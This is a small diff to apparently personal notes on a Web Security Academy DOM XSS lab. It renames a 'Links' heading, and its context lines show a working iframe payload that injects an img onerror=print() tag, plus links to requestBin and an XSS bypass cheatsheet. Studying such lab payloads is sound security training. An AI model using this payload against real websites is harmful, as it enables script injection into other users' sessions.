@@ -73,6 +73,6 @@ iframe:
 <iframe src="https://0a9800c3034ba0e181fafc8700b00051.web-security-academy.net/#" onload=this.src+="%3Cimg%20src=x%20onerror=print()%3E"></iframe>
 ```
 
-## Links
+## Resources
 - [requestBin](https://public.requestbin.com/)
 - [Ghetto XSS Cheatsheet](https://d3adend.org/xss/ghettoBypass)
